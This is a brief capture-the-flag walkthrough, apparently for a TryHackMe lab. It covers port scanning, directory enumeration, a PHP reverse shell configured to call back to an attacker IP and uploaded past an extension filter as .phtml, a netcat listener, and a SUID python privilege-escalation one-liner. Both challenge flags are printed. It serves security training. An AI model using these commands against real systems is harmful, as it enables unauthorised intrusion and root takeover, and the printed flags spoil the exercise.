# Initial 
'''
start machine

nmap -sC -sV "machines IP" -oN nmap/initial.txt
'''

# Nmap Output
'''
# Nmap 7.94 scan initiated Sun Jan 21 14:31:42 2024 as: nmap -sC -sV -oN nmap/initial.txt 10.10.25.147
Nmap scan report for 10.10.25.147
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 21 14:33:15 2024 -- 1 IP address (1 host up) scanned in 93.14 seconds

'''

# Gobuster

Using gobuster for scanning directori web

'''
gobuster dir -u http://IPMACHINE -w "wordlist-path"

found /panel dan /uploads

'''

# Reverse shell 

Reverse shell I using from wordlist

'''
/usr/share/webshells/php/php-reverse-shell.php

'''

and I edit some parameter like IP local attacker dan port

'''
et_time_limit (0);
$VERSION = "1.0";
$ip = '10.6.23.159';  // CHANGE THIS
$port = 9999;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
'''
and change format file from .php to .phtml or .php3

Using NC for listening port dan reverse shell

'''
nc -lnvp 9999

'''

After upload file success, go to /uploads dan click the file 

and go back to the terminal and see nc success listening using python for stabilise shell

'''
python -c 'import pty;pty.spawn{"/bin/bash")'

find / -type f -name user.txt

'''

'''
the flag
THM{y0u_g0t_a_sh3ll}
'''

# Privilage Escalation

'''
find / -type f -user root -perm -4000 2>/dev/null
'''

find the SUID binaries, and /usr/bin/python is weird, and i go https://gtfobins.github.io/ to search privelage escalation for python SUID. 

'''
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
'''

And wala, your shell become root, and the last think search the root flag

'''
/root/
cat root.txt

THM{pr1v1l3g3_3sc4l4t10n}
'''